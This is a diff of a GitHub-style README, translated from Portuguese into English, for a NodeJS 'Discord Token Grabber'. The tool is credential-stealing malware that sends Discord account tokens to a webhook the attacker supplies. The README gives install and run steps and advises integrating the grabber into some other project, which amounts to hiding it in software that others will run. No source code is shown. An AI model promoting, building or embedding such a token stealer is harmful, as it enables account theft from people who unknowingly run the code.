@@ -1,16 +1,16 @@
 **DISCORD TOKEN GRABBER**
 
-Código feito 100% utilizando NodeJS juntamente às packages `Axios` & `Node-Fetch`
+Code made 100% using NodeJS together with the `Axios` &` Node-Fetch` packages.
 
 **INSTALL**
 
-`1º Instale Node-JS`
+`1º Install Node-JS`
 
-`2º Após instalação do NodeJS, baixe os arquivos e instale as packages | npm i axios node-fetch`
+`2º After installing NodeJS, download the files and install the packages | npm i axios node-fetch`
 
-`3º Coloque o link do webhook`
+`3º Place the webhook link`
 
-`4º Digite " node . " e pronto. Só integrar em algum projeto e utilizar`
+`4º Type " node . " And you're done. Only integrate in some project and use`
 
 
 ![image](https://user-images.githubusercontent.com/69597508/90052172-1fda2900-dcaf-11ea-8fb9-c25d35e15d2f.png)
